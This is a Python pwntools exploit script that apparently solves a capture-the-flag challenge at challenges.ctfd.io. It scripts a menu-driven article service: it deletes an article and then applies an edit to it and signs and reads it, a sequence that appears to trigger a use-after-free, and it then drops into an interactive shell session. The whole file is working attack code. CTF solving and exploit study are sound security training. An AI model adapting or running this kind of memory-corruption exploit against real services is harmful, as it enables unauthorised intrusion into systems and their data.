from pwn import *
target=remote('challenges.ctfd.io' ,30097)
def init_index(option,index):
	print(target.recvuntil("> "))
	target.sendline(str(option))
	print(target.recvline())
	target.sendline(str(index))
	print(target.recvline())
def add_article(content):
	print(target.recvuntil("> "))
	target.sendline("1")
	print(target.recvline())
	target.send(content)
	print(target.recvline())
def add_edit_insert(index,offset,content):	
	init_index(2,index)	
	target.sendline("1")
	print(target.recvline())
	target.sendline(str(offset))
	print(target.recvline())
	target.sendline(content)
	print(target.recvline())
def apply_edit(index):
	init_index(3,index)	
def sign_article(index):	
	init_index(4,index)	
	print(target.recvline())
def read_article(index):
	init_index(5,index)	
def delete_article(index):
	print(target.recvuntil("> "))
	target.sendline("6")
	print(target.recvline())
	target.sendline(str(index))
add_article("A"*140)
add_edit_insert(0,0,"A")
delete_article(0)
apply_edit(0)
sign_article(0)
read_article(0)
target.interactive()
